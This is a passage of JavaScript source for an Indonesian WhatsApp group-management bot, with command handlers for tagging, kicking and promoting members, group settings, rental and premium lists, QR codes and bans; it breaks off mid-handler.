teks += `◦ ${mem.id.split('@')[0]}\n`
}
alice.sendMessage(m.chat, {
text: teks,
mentions: participants.map(a => a.id)
}, {
quoted: floc
})
}
break
case 'z': case 'hidetag':
if (!isCreator && !isOwner && !isAdmins && !isPremium) return reply(mess.admin)
if (!text) return reply(`Teks?`)
alice.sendMessage(m.chat, { text : text ? text : '' , mentions: participants.map(a => a.id)}, { quoted: m })
break

case 'joingc': case'join': {
if (!isCreator) return reply('[ System Notice ] Access Deny')
if (!text) return reply(`Kirim perintah ${prefix + command} linkgrup`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.error.Iv)
reply('Proses Bergabung...')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await alice.groupAcceptInvite(result).then((res) => reply('berhasil')).catch((err) => reply('berhasil'))
}
break
case 'leavegc': {
if (!isCreator) return reply('[ System Notice ] Access Deny')
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return onlyAdmin()
if (!isBotAdmins) return botAdmin()
await alice.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'owner':
let pp = await alice.profilePictureUrl(`${nomore}@s.whatsapp.net`, 'image').catch((_) => "https://telegra.ph/file/1ecdb5a0aee62ef17d7fc.jpg");
let soond = await getBuffer('https://telegra.ph/file/b4082cd207d7e88c34eaf.jpg')
alice.sendkontak(from, '𝙳𝙰𝚁𝚆𝙸𝙽', [['𝙳𝙰𝚁𝚆𝙸𝙽', `${global.owner2}`, 'Pemula Kok']], m, { contextInfo: { externalAdReply: {  title: '𝚁𝙴𝙰𝙻 𝙳𝙴𝙲𝙾𝙳𝙴𝚁', body: '𝙳𝙾𝙽𝚃 𝚂𝙿𝙰𝙼 𝚂𝙸𝚂 ✆', text: 'Pemula Kok', caption: 'Save Nomor Wiwin Ya 😐', description: 'Save Nomor Wiwin Ya 😐', thumbnailUrl: pp, sourceUrl: `https://wa.me/${global.owner2}`, mediaType: 1, showAdAttribution: false, renderLargerThumbnail: true }}},{quoted: fpayment2})
break
case "kontakme":{
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `Powered By Alice`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Tap Disini\nFN:Owner ${pushname}\nitem1.TITLE:Kontak ${pushname}\nURL:Alicechat.chatango.com\nitem496.TEL;waid=${nomore}:owner\nitem496.X-ABLabel:Owner\nitem496.TEL;waid=${botNumber.split('@')[0]}:Bot\nitem496.X-ABLabel:Bot\nX-WA-BIZ-DESCRIPTION:Developer\nEND:VCARD`,
}
}), { userJid: m.chat, quoted: "" })
alice.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
break
case 'getname':
if (!isGroup) return onlyGroup()
if (!isBotAdmins) return botAdmin()
if (m.quoted || q) {
if (froms in db.users) {reply(`${db.users[froms].name}`)} else {reply(`${await alice.getName(froms)}`)}
} else reply('Tag atau reply pesan target!')
break //Powered By alice & Darwin
case 'delsession':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return onlyAdmin()
if (!isBotAdmins) return botAdmin()
break // Powered By Winn
case 'getpp':
if (m.quoted || q) {
let pporang = await alice.profilePictureUrl(froms, 'image').catch(_ => reply('Profile di private!'))
if (pporang) return alice.sendMessage(from, {image: {url:pporang}, caption: 'Nih!'}, {quoted:m})
} else reply('Tag atau reply pesan target!')
break //Powered By alice & Darwin
case 'setnamabot': case 'setnamebot': {
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return onlyAdmin()
if (!isBotAdmins) return botAdmin()
if (!text) throw `Example : ${prefix + command} WhatsApp ✅`
let name = await alice.updateProfileName(text)
reply(`Successfully renamed`)
}
break //Powered By alice & Darwin
case 'setstatus': case 'setbiobot': case 'setbotbio': {
if (!isCreator) return onlyGroup()
if (!text) throw `this is a WhatsApp Bot named Darwin Bod`
let name = await alice.updateProfileStatus(text)
reply(`Successfully changed bot bio`)
}
break //Powered By alice & Darwin
case 'getbio':
if (!isGroup) return onlyGroup()
if (m.quoted || q) {
let biou = (await alice.fetchStatus(froms).catch(err => console.log(chalk.redBright('[ ERROR ]'), chalk.whiteBright(err))) || {}).status || 'Bio di private!'
reply(biou)
} else reply('Tag atau reply pesan target!')
break //Powered By alice & Darwin
case 'd': case 'del': case 'delete': case 'hapus':
if (!m.quoted) return reply('Reply pesan yang ingin dihapus!')
alice.sendMessage(from, {delete: {remoteJid: from, id: m.quoted.id, fromMe: m.quoted.fromMe, participant: m.quoted.sender }})
break //Powered By alice & Darwin
case'promoteall':
if (!isCreator) return m.reply('Only Creator...')
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return onlyAdmin()
if (!isBotAdmins) return botAdmin()
var groupe = await alice.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
alice.groupParticipantsUpdate(from, mems, 'promote')
break
case 'promote': case 'pm':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return onlyAdmin()
if (!isBotAdmins) return botAdmin()
if (!froms) return reply(`Tag atau balas pesan member yang ingin dijadikan admin`)
alice.groupParticipantsUpdate(from, [froms], 'promote').then(res => {
alice.sendMessage(from, {text: `Sukses menjadikan @${froms.split('@')[0]} sebagai admin`, mentions: [froms]}, {quoted:m})
}).catch(() => reply(m.error.api))
break //Powered By alice & Darwin
case 'demote': case 'dm':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return onlyAdmin()
if (!isBotAdmins) return botAdmin()
if (!froms) return reply(`Tag atau balas pesan admin yang ingin dijadikan member biasa`)
if (froms == global.owner || froms == botNumber) return reply(`Tidak bisa demote ${froms == global.owner ? 'creator saya' : 'bot'}!`)
alice.groupParticipantsUpdate(from, [froms], 'demote').then(res => {
alice.sendMessage(from, {text: `Sukses menjadikan @${froms.split('@')[0]} sebagai member biasa`, mentions: [froms]}, {quoted:m})
}).catch(() => reply(m.error.api))
break //Powered By alice & Darwin
case 'add':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return onlyAdmin()
if (!isBotAdmins) return botAdmin()
if (!froms) return reply("Balas pesan atau masukan nomor target!")
if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
var cek = await alice.onWhatsApp(froms)
if (cek.length == 0) return reply(`Masukkan nomer yang valid dan terdaftar di WhatsApp`)
let add = await alice.groupParticipantsUpdate(from, [froms], "add")
Object.entries(add).map(([_, v]) => {
if (v.status === '403'){
reply(`Gagal menambahkan peserta dengan alasan: *Diprivate oleh yang bersangkutan*`)
} else if (v.status === '409'){
reply('Orang yang anda add sudah berada didalam Grup!')
} else if (v.status === '408'){
reply(`Gagal menambahkan peserta dengan alasan: *Dia baru keluar group baru baru ini*`)
} else if (v.status === '401'){
reply(`Gagal menambahkan peserta dengan alasan: *Bot di block oleh yang bersangkutan*`)
} else reply(`Sukses menambahkan member`)
})
break //Powered By alice & Darwin
case 'kick':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return onlyAdmin()
if (!isBotAdmins) return botAdmin()
if (!froms) return reply(`Tag atau balas pesan orang yang ingin di keluarkan!`)
if (froms == global.owner || froms == botNumber) return reply(`Tidak bisa kick ${froms == global.owner ? 'creator saya' : 'bot'}!`)
var data = await alice.groupParticipantsUpdate(from, [froms], "remove")
for (let ryaa of data) {
if (ryaa.status === '406'){
reply(`Gagal kick member dengan alasan: *Dia yang membuat grup ini*`)
} else {
reply('Sukses kick member')
alice.imgToSticker(from, fs.readFileSync('./assets/sticker/kick.jpg'), m, {packname: packname, author: global.author})
}
}
break //Powered By alice & Darwin
case 'groupinfo': case 'infogrup':
case 'infogroup': case 'infogc':{
if (!isGroup) return onlyGc()
try {
let meta = await (await alice.groupMetadata(m.chat))
let admin = meta.participants.filter(p => p.admin)
let listAdmin = admin.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
let pic = await getBuffer(await alice.profilePictureUrl(m.chat, 'image').catch(_ => ppnyauser))
let caption = `乂  *G R O U P - I N F O*\n
◦  *Name* : ${meta.subject}
◦  *ID* : ${meta.id}
◦  *Owner* : ${meta.owner ? '@' + meta.owner.split('@')[0] : m.chat.match('-') ? '@' + m.chat.split('-')[0] : ''}
◦  *Created* : ${moment(meta.creation * 1000).format('DD/MM/YY HH:mm:ss')}
◦  *Member* : ${meta.participants.length}
◦  *Admin* : ${admin.length}
◦  *Kirim pesan* : ${meta.announce ? 'Hanya admin' : 'Semua peserta'}
◦  *Edit info grup* : ${meta.restrict ? 'Hanya admin' : 'Semua peserta'}
◦  *List Admin* :\n${listAdmin}\n
◦  *Deskripsi grup* :\n${meta.desc}`.trim()
sendMessageModify(m.chat, caption, m, {
thumbUrl: ppnyauser, 
largeThumb: true, 
thumbnail: pic
})
} catch (e) {
console.log(e)
alice.sendteks(m.chat, util.format(e), m)
}
}
break //Powered By alice & Darwin
case 'linkgrup': case 'linkgc':
if (!isGroup) return onlyGc()
if (!isBotAdmins) return botAdmin()
var url = await alice.groupInviteCode(from).catch(() => reply(m.error.api))
url = 'https://chat.whatsapp.com/'+url
reply(url)
break //Powered By alice & Darwin
case 'timergc':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return onlyAdmin()
if (!isBotAdmins) return botAdmin()
let timergc = "PILIH WAKTU RESET CHAT"
alice.sendPoll(from, timergc, [`24 jam`,`7 hari`,'90 hari','mati'])
break
case '24':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return !0;
if (!isBotAdmins) return botAdmin()
alice.groupToggleEphemeral(m.chat, 1*24*3600)
reply('Timer di set ke 24 jam')
break
case '7':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return Cuekin
if (!isBotAdmins) return botAdmin()
alice.groupToggleEphemeral(m.chat, 7*24*3600)
reply('Timer di set ke 7 hari')
break
case '90':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return Cuekin
if (!isBotAdmins) return botAdmin()
alice.groupToggleEphemeral(m.chat, 90*24*3600)
reply('Timer di set ke 90 hari')
break
case 'mati':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return !0;
if (!isBotAdmins) return botAdmin()
alice.groupToggleEphemeral(m.chat, 0*24*3600)
reply('Timer telah di matikan')
break
case 'grup': case 'gc': {
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return !0;
if (!isBotAdmins) return botAdmin()
if (args[0] === 'close'){
await alice.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`*GROUP TELAH DI TUTUP!*`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await alice.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(`*GROUP TELAH DI BUKA!*`)).catch((err) => m.reply(jsonformat(err)))
} else {
wiwin1 = "Choose The Poll"
await delay(500)
await alice.sendPoll(from, wiwin1, [`grup open`,`grup close`])
 }
}
break // Powered By Winn
case 'autojoin': {
if(!isCreator&&!isOwner&&!isPremium) return reply(mess.prem)
if (args[0] === 'on'){
if (global.autojoin) return reply('auto join sudah aktif!')
global.autojoin = true
reply('auto join telah di aktifkan')
} else if (args[0] === 'off'){
if (global.autojoin) return reply('auto join sudah mati!')
global.autojoin = false
reply('auto join telah di matikan')
} else {
wiwings = "Choose The Poll"
await alice.sendPoll(from, wiwings, [`autojoin on`,`autojoin off`])
}
}
break // Powered By Winn
case'delsampah':{
let directoryPath = path.join('./.npm') //&& './assets') //path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
return reply('Tidak dapat memindai direktori: ' + err);
} 
let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3") || item.endsWith("mp4") || item.endsWith("jpg") || item.endsWith("jpeg") || item.endsWith("webp") || item.endsWith("webm")  )
var teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return reply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})
reply("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./.npm/${file}`) //&& `./assets/${file}`) 
});
await delay(2000)
reply("Berhasil menghapus semua sampah")
});
}
break // Powered By Winn

case 'revoke':
if (!isGroup) return onlyGc()
if (isAdmins && !isOwner) return onlyAdmin()
if (isBotAdmins) return botAdmin()
await alice.groupRevokeInvite(from).then(res => {reply(`Sukses menyetel ulang tautan grup!\nTautan baru: https://chat.whatsapp.com/${res}`)}).catch(() => reply(m.error.api))
break //Powered By alice & Darwin
case 'left': 
{
if (!isCreator) return reply('upps tidak bisa (´-﹏-`；)')
alice.groupLeave(m.chat)
reply('Babayo...')
}
break //Powered By alice & Darwin
case 'getlinkgc': case 'getlinkgroup': case 'getlinkgrup':{
if (!isCreator) return onlyOwner()
if (!text) return reply('```ID GC NYA MANA?```')
let getlinkgc = await alice.groupInviteCode(text).catch((err) => reply('```BOT BUKAN ADMIN DI GC TERSEBUT [!]```'))
reply(`https://chat.whatsapp.com/${getlinkgc}\n\n`)
}
break
case 'setppgc': {
if (!isCreator && !isOwner) return onlyOwner()
if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await alice.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/panjang`) {
var { img } = await generateProfilePicture(medis)
await alice.query({
tag: 'iq',
attrs: {
to: from,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(`Sukses\n\n`)
} else {
var memeg = await alice.updateProfilePicture(from, { url: medis })
fs.unlinkSync(medis)
reply(`Sukses\n\n`)
}
}
break
case 'setgrupname': case 'gcname':
if (!isGroup) return onlyGc()
if (isAdmins && !isOwner) return onlyAdmin()
if (isBotAdmins) return botAdmin()
if (!q) return reply(`Gunakan dengan cara ${comand} *text*\n\n_Contoh_\n\n${comand} Support ${ownerName}`)
await alice.groupUpdateSubject(from, q).then(res => {reply(m.ok)}).catch(() => reply(m.error.api))
break //Powered By alice & Darwin
case 'setdesc': case 'setdesk':
if (!isGroup) return onlyGc()
if (isAdmins && !isOwner) return onlyAdmin()
if (isBotAdmins) return botAdmin()
if (!q) return reply(`Gunakan dengan cara ${comand} *text*\n\n_Contoh_\n\n${comand} New Description by ${global.ownerName}`)
await alice.groupUpdateDescription(from, q).then(res => {reply(m.ok)}).catch(() => reply(m.error.api))
break //Powered By alice & Darwin
case 'sewabot':
let txse = `Please contact the ownet`
reply(txse)
break
case 'listsewa':

let list_sewa_list = `*LIST SEWA GROUP*\n\n*Total:* ${sewa.length}\n\n`
let data_array = [];
for (let x of sewa) {
    list_sewa_list += `*Name:* ${await getGcName(x.id)}\n*ID :* ${x.id}\n`
    if (x.expired === 'PERMANENT') {
        let ceksewa = 'PERMANENT'
        list_sewa_list += `*Expire :* PERMANENT\n\n`
    } else {
        let ceksewa = ms(x.expired - Date.now())
        list_sewa_list += `*Expire :* ${ceksewa.days} day(s) ${ceksewa.hours} hour(s) ${ceksewa.minutes} minute(s) ${ceksewa.seconds} second(s)\n\n`
    }
}
alice.sendMessage(from, { text: list_sewa_list }, { quoted: m })
break
case 'checksewa': case 'ceksewa':
if (!isGroup) return reply('Only group')
if (!isSewa) return reply(`Bot tidak di sewa group ini!`)
let ceksewa = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
let sewanya = `*Expire :* ${ceksewa.days} day(s) ${ceksewa.hours} hour(s) ${ceksewa.minutes} minute(s)`
reply(sewanya)
break
case'addsewa':
if (!isCreator) return reply(mess.owner)
if (text < 2) return reply(`Gunakan dengan cara ${prefix+command} *linkgc waktu*\n\nContoh : ${prefix+command} https://chat.whatsapp.com/PnwpPqn0b 30d`)
if (!isUrl(args[0])) return reply('`OPPS OPSI SALAH`\nberi perintah dengan link yang valid')
var url = args[0]
url = url.split('https://chat.whatsapp.com/')[1]
if (!text) return reply(`Waktunya?`)
var data = await alice.groupAcceptInvite(url)
if (_sewa.checkSewaGroup(data, sewa)) return reply(`Bot sudah disewa oleh grup tersebut!`)
_sewa.addSewaGroup(data, args[1], sewa)
reply(`Success Add Sewa Group Berwaktu!`)
break
case'delsewa':
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(`Perintah ini hanya bisa dilakukan di Grup yang menyewa bot`)
if (!isSewa) return reply(`Bot tidak disewa di Grup ini`)
addCountCmd('#delsewa', m.sender, _cmd)
sewa.splice(_sewa.getSewaPosition(args[0] ? args[0] : m.chat, sewa), 1)
fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa, null, 2))
reply(`Sukses`)
break






























// FITUR OWNER
case 'giveaway':
let member = participants.map((u) => u.id)
let org = member[Math.floor(Math.random() * member.length)]
if (!args[0]) return reply(`*[ Give Away ]* masukkan nominal nya!`)
if (isNaN(args[0])) return reply(`*[ Give Away ]* nominal harus berupa angka!`)
if (Number(args[0]) >= 9999999999999999) return reply795('Kebanyakan!')
let countt = args[0].length > 0 ? Math.min(9999999999999999, Math.max(parseInt(args[0]), 1)) : Math.min(1)
if (countt < 100) return reply795('*[ Give Away ]* minimal 1,000 untuk bisa give away!')
if (cekSaldo(sender, db_saldo) >= countt * 1) {
addSaldo(`${org.split('@')[0]}`, countt * 1, db_saldo)
reply795(`*GIVE AWAY*\n${tag} membagikan saldonya kepada member acak sebanyak *Rp. ${countt}*\n\nPemenang :  @${org.split('@')[0]}\nSaldo : Rp. ${countt}\nTanggal : ${Harinih}`)
} else reply(`Saldo kamu tidak mencukupi untuk give away sebesar ${countt}`)
break
case 'mode':
if(!isCreator&&!isPremium&&!isOwner) return !0;
let wiwinh = `*Public Mode*  :   *${global.self ? '[ OFF ]' : '[ ON ]'}*\n`
wiwinh += `*Game Mode*  :   *${global.game ? '[ ON ]' : '[ OFF ]'}*\n`
wiwinh += `*Read Status*  :   *${global.autoreadsw ? '[ ON ]' : '[ OFF ]'}*\n`
wiwinh += `*No Call*       :   *${global.autoreject ? '[ ON ]' : '[ OFF ]'}*\n`
wiwinh += `*Welcome*     :   *${global.welcome ? '[ ON ]' : '[ OFF ]'}*\n`
wiwinh += `*Antilink*       :   *${global.antilink ? '[ ON ]' : '[ OFF ]'}*`
alice.sendPoll(from, wiwinh, [`antilink`,`antibot`,`anticall`,`welcome`])
break
case 'leaveall':
if (!isOwner) return  reply(mess.owner)
let totalgerup = alice.chats.array.filter(u => u.jid.endsWith('@g.us')).map(u => u.jid)
for (let id of totalgerup) {
alice.sendMessage(id, {text:'Selamat Tinggal'})
await delay(3000)
alice.groupLeave(id)
}
break
case 'setqris':
if(!isOwner && !isCreator) return reply(mess.owner)
if(!text) return reply('masukan gambar qris berupa url, buat url dengan command *tourl*')
global.qris = text
reply('baik sudah')
break
case 'tagih':
if(!isOwner && !isAdmins && !isCreator) return reply(mess.admin)
if (!froms) return reply(`Mau tagih siapa? coba reply pesannya 🤔`)
if (froms == global.owner || froms == botNumber) return reply(`goblok banget nagih ${froms == global.owner ? 'creator' : 'bot'}!`)
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')
}
let penghutang = alice.getName(froms)
reply(`${penghutang} Akan di tagih ${q} dimulai dari sekarang`)
setTimeout(() => {
alice.sendMessage(froms,{image: {url: global.qris}, caption: global.tagih})
}, timer)
break
case 'settagih':
if(!text) return reply('masukan text tagihannya ⌨️')
global.tagih = text
reply('baik sudah di ganti 👀')
break
case 'warcall': {
if (!isCreator && !isOwner) return reply('only winn')
if (!text) return reply(`Example : ${prefix + command} Open VCS`)
var call = { 
scheduledCallCreationMessage: {
callType: 0,
scheduledTimestampMs:  Date.now(),
title: `${text}`
}}
alice.relayMessage(m.chat, call, {})
}
break
case "listprem":
        let txte = `List Prem\nJumlah : ${premium.length}\n\n`;
        let men = [];
        for (let i of premium) {
          men.push(i.id);
          txte += `*ID :* @${i.id.split("@")[0]}\n`;
          if (i.expired === "PERMANENT") {
            let cekvip = "PERMANENT";
            txte += `*Expire :* PERMANENT\n\n`;
          } else {
            let cekvip = ms(i.expired - Date.now());
            txte += `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`;
          }
        }
        replyURL(txte)
        break;
case'addprem':{
if (!isCreator) return reply(mess.owner)
const swn = args.join(" ")
const pcknm = swn.split(".")[0];
const atnm = swn.split(".")[1];
if (!pcknm) return reply(`Penggunaan :\n*${prefix}addprem* @tag.waktu\n*${prefix}addprem* nomor.waktu\n\nContoh : ${prefix+command} ${tag}.30d`)
if (!atnm) return reply(`Mau yang berapa hari?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
_prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply('Sukses')
} else {
var cekap = await alice.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
_prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply('Sukses')
}}
break
case'delprem':
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
premium.splice(_prem.getPremiumPosition(users, premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
reply('Sukses!')
} else {
var cekpr = await alice.onWhatsApp(args[0]+"@s.whatsapp.net")
if (cekpr.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
premium.splice(_prem.getPremiumPosition(args[0] + '@s.whatsapp.net', premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
reply('Sukses!')
}
break
        
case 'auto-ai': case 'autoai':
if (!isCreator) return reply("Dibuat untuk owner")
if (args[0] == 'on'){
global.autoTyping = true
reply('Nobara auto ai telah aktif')
} else if (args[0] == 'off'){
global.autoTyping = false
reply('Auto AI dimatikan, jangan lupa donasi owner')
} else reply('on / off')
break
case 'public': case 'publik':
if (!isCreator && !isOwner && !isPremium) return reply(mess.prem)
if (global.self) return reply('*[ System Notice ]* public mode *on*')
global.self = true
reply('*[ System Notice ]* success change mode')
break //Powered By alice & Darwin
case 'self': case 'modeself':
if (!isCreator && !isOwner && !isPremium) return reply(mess.prem)
if (!global.self) return reply('*[ System Notice ]* sudah aktif')
global.self = false
reply('*[ System Notice ]* success change mode')
break
case 'autoreject': case 'anticall':
if (!botNumber) return onlyOwner()
if (args[0] == 'on'){
if (global.autoreject) return reply('UDAH ON!')
global.autoreject = true
reply('Fitur auto reject telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.autoreject) return reply('UDAH OFF!')
global.autoreject = false
reply('Fitur auto reject telah di matikan')
} else reply('on / off')
break
case 'onlypc':
if (!isCreator&&!isPremium) return reply(mess.prem)
if (args[0] == 'on'){
if (global.onlypc) return reply('udah on!')
global.onlypc = true
reply('sukses only private chat')
} else if (args[0] == 'off'){
if (!global.onlypc) return reply('sudah dimatikan sebelumnya!')
global.onlypc = false
reply('sukses menonaktifkan')
} else reply('on / off')
break //Powered By alice & Darwin
case 'onlygc':
if (!isCreator&&!isPremium) return reply(mess.prem)
if (args[0] == 'on'){
if (global.onlygc) return reply('udah on!')
global.onlygc = true
reply('sukses only group chat')
} else if (args[0] == 'off'){
if (!global.onlygc) return reply('sudah dimatikan sebelumnya!')
global.onlygc = false
reply('sukses menonaktifkan')
} else reply('on / off')
break //Powered By alice & Darwin
case 'antilink':
if (!isCreator&&!isPremium) return reply(mess.prem)
if (args[0] == 'on'){
if (global.antilink) return reply('UDAH ON!')
global.antilink = true
reply('Fitur antilink telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.antilink) return reply('UDAH OFF!')
global.antilink = false
reply('Fitur antilink telah di matikan')
} else reply('on / off')
break //Powered By alice & Darwin
case 'autodelete':
if (!isCreator&&!isPremium) return reply(mess.prem)
if (args[0] == 'on'){
if (global.autodel) return reply('UDAH ON!')
global.autodel = true
reply('Fitur auto delete telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.autodel) return reply('UDAH OFF!')
global.autodel = false
reply('Fitur auto delete telah di matikan')
} else reply('on / off')
break //Powered By alice & Darwin
case 'antibot':
if (!isCreator&&!isPremium) return reply(mess.prem)
if (args[0] == 'on'){
if (global.antibot) return reply('UDAH ON!')
global.antibot = true
reply('Fitur antibot telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.antibot) return reply('UDAH OFF!')
global.antibot = false
reply('Fitur antibot telah di matikan')
} else reply('on / off')
break //Powered By alice & Darwin
case 'autodownload':
if (!isCreator&&!isPremium) return reply(mess.prem)
if (args[0] == 'on'){
if (global.autodonlod) return reply('sudah aktif!')
global.autodonlod = true
reply('mode auto download aktif')
} else if (args[0] == 'off'){
if (!global.autodonlod) return reply('sudah dimatikan!')
global.autodonlod = false
reply('mode auto download matikan')
} else reply('on / off')
break //Powered By alice & Darwin
case 'autoreadsw': case 'autoread':
if (!isCreator&&!isPremium) return reply(mess.prem)
if (args[0] == 'on'){
if (global.autoreadsw) return reply('UDAH ON!')
global.autoreadsw = true
reply('Fitur auto read sw telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.autoreadsw) return reply('UDAH OFF!')
global.autoreadsw = false
reply('Fitur auto read sw telah di matikan')
} else reply(`gunakan dengan ${prefix}${command} on / off`)
break
case "createqr": {
const qrcode = require('qrcode')
if (!text) return reply(`Penggunaan Salah Harusnya ${prefix+command} Darwin Sayang`)
const qyuer = await qrcode.toDataURL(text, { scale: 8 })
let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
alice.sendMessage(from, { image: data, caption: `Nih Qr Codenya, reply dengan pesan *.detectqr* untuk mendeteksi text yang sudah dibuat menjadi Qr` }, { quoted: m })
}
break
case "detectqr":
if (/image\/(jpe?g|png)/.test(mime)) {
mee = await alice.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
const res123 = await fetch(`http://api.qrserver.com/v1/read-qr-code/?fileurl=${mem}`)
const datas = await res123.json() 
reply(util.format(datas[0]))
} else reply(`Reply Image Yang Ada Qr Nya`)
break
case 'banned': case 'ban':
if (!isCreator&&!isPremium) return reply(mess.prem)
if (m.quoted || q) {
if (!(froms in db.users)) return reply('User tidak terdaftar didalam DATABASE!')
if (db.users[froms].banned) return reply('Udah banned!')
db.users[froms].banned = true
reply(`Berhasil banned *${db.users[froms].name}*`)
} else reply('Tag atau reply pesan target!')
break
case 'unbanned': case 'unban':
if (!isCreator&&!isPremium) return reply(mess.prem)
if (m.quoted || q) {
if (!(froms in db.users)) return reply('User tidak terdaftar didalam DATABASE!')
if (!db.users[froms].banned) return reply('Udah unbanned!')
db.users[froms].banned = false
reply(`Berhasil menghapus *${db.users[froms].name}* dari daftar banned`)
} else reply('Tag atau reply pesan target!')
break

case 'setprefix':
if (!isCreator&&!isPremium) return reply(mess.prem)
if (!q) return reply(`Contoh: ${comand} #`)
if (global.prefix == args[0]) return reply('Prefixnya udah itu kocak!')
global.prefix = args[0]
reply(`Prefix successfully changed to : ${args[0]}`)
break
case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!isCreator&&!isPremium) return reply(mess.prem)
if (isBotAdmins) return reply('adminkan botnya')
await alice.removeProfilePicture(from)
}
break
case 'deleteppbot': case 'delppbot': {
if (!isCreator&&!isPremium) return reply(mess.prem)
await alice.removeProfilePicture(alice.user.id)
replygcxeon(`Success in deleting bot's profile picture`)
}
break
case 'setpp': case 'setppbot':
if (!isCreator&&!isPremium) return reply(mess.prem)
if (!isImage || isQuotedImage) {
if (args[0] == 'full' || args[0] == 'panjang'){
let media = await alice.downloadAndSaveMediaMessage(quoted, pw)
await alice.createprofile(botNumber, media)
reply('suksess')
} else {
let media = await alice.downloadAndSaveMediaMessage(quoted, pw)
var data = await alice.updateProfilePicture(botNumber, { url: media })
reply('done banj')
}
} else reply(`Kirim/balas gambar dengan caption ${command} untuk mengubah foto profil bot`)
break
case 'blok': case 'block':
if (!isCreator&&!isPremium) return reply(mess.prem)
if (!froms) return reply(`Tag atau reply pesan target!`)
alice.updateBlockStatus(froms, 'block')
reply('Sukses block target')
break
case 'unblok': case 'unblock':
if (!isCreator&&!isPremium) return reply(mess.prem)
if (!froms) return reply(`Tag atau reply pesan target!`)
alice.updateBlockStatus(froms, 'unblock')
reply('Sukses unblock target')
break
case 'listblock':
let listblok = await alice.fetchBlocklist()
reply('*LIST BLOCK*\n' + `Total: ${listblok == undefined ? '*0* Diblokir' : '*' + listblok.length + '* Diblokir'}\n\n` + listblok.map(v => '» @' + v.replace(/@.+/, '')).join`\n`)
break
case 'delchat':
if (!isCreator && !isOwner) return onlyOwner()
await alice.chatModify({delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]}, from)
reply('sukses menghapus chat')
break
case 'readvo': case 'rvo': {
if (!isQuotedViewOnce) return reply('Reply viewonce')
let type = Object.keys(m.quoted.message)[0]
let quotedType = m.quoted.message[type]
